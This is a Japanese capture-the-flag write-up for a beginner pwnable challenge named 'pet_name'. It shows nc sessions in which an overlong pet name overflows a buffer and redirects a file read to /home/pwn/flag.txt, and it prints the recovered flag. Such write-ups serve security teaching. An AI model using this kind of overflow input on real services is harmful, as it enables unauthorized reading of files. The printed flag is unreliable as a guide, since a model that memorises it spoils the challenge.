# pet_name:pwnable:100pts
ペットに名前を付けましょう。ちなみにフラグは/home/pwn/flag.txtに書いてあるみたいです。  
`nc pet-name.challenges.beginners.seccon.jp 9080`  

[pet_name.zip](pet_name.zip)  

# Solution
接続先とソースが渡される。  
接続すると猫に名前を付けられるようだ。  
```bash
$ nc pet-name.challenges.beginners.seccon.jp 9080
Your pet name?: Pwndog
Pwndog sound: meow
```
ひとまず長すぎる名前を付けてみる。  
```bash
$ nc pet-name.challenges.beginners.seccon.jp 9080
Your pet name?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
File not found: AAAAAAAAAAAAAAAAAA
```
すると`File not found`と`AAAAAAAAAAAAAAAAAA`が表示された。  
`AAAAAAAAAAAAAAAAAA`をファイル名だと認識していそうなので、ここを`/home/pwn/flag.txt`にしてみる。  
```bash
$ nc pet-name.challenges.beginners.seccon.jp 9080
Your pet name?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/home/pwn/flag.txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/home/pwn/flag.txt sound: ctf4b{3xp1oit_pet_n4me!}
```
恐ろしい名前のペットからflagが得られた。  

## ctf4b{3xp1oit_pet_n4me!}